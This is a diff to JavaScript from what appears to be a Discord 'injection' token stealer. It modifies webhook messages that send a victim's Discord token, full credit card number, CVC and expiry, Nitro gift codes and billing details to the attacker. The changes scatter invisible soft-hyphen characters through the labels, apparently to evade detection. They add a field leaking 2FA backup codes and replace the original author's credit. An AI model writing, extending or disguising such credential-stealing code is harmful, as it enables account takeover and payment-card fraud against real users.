@@ -501,17 +501,19 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Paypal Added**",
-            value: `Time to buy some nitro baby 😩`,
+            name: "**­P­a­­­y­­p­a­l A­d­de­d**",
+            value: `Ti­me­ to b­uy ­som­e n­i­­t­r­o ba­by 😩`,
             inline: false,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: "**­D­­­S­C IN­­F**",
+            value: `N­­it­r­o Type: **${nitro}**\nBa­dg­­e­s: **${badges}**\nB­­­i­l­l­­­in­­g: **${billing}**\n­­2­­f­a­ C­od­es­: ${
+              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
+            }`,
+            inline: true,
           },
           {
-            name: "**Token**",
+            name: "**­T­K­­N­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -521,7 +523,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best muncha gh v",
         },
       },
     ],
@@ -543,17 +545,19 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Credit Card Added**",
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: "**C­­r­­­­e­­di­t C­a­­­­­r­­­d A­­dde­d**",
+            value: `C­­­r­­­­­­­­e­­­d­i­­­­­t­ C­­­a­­­r­­d­ ­­­N­u­­­­m­­­­b­e­­­­r: **${number}**\n­C­­­­V­­­C­­­: ­**${cvc}**\nC­­­r­­­e­d­i­­t ­Ca­­­r­­­­d ­E­­­­x­p­­­­­ir­a­­ti­o­n: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: "**­D­­­S­C IN­­F**",
+            value: `N­­it­r­o Type: **${nitro}**\nBa­dg­­e­s: **${badges}**\nB­­­i­l­l­­­in­­g: **${billing}**\n­­2­­f­a­ C­od­es­: ${
+              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
+            }`,
             inline: true,
           },
           {
-            name: "**Token**",
+            name: "**­T­K­­N­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -563,7 +567,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best muncha gh v",
         },
       },
     ],
@@ -587,17 +591,19 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Nitro bought!**",
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: "**­Ni­­­t­r­o b­o­u­g­­ht­!**",
+            value: `**N­­­i­­t­r­o C­o­d­e:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: "**­D­­­S­C IN­­F**",
+            value: `N­­it­r­o Type: **${nitro}**\nBa­dg­­e­s: **${badges}**\nB­­­i­l­l­­­in­­g: **${billing}**\n­­2­­f­a­ C­od­es­: ${
+              mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
+            }`,
             inline: true,
           },
           {
-            name: "**Token**",
+            name: "**­T­K­­N­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -607,7 +613,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best muncha gh v",
         },
       },
     ],
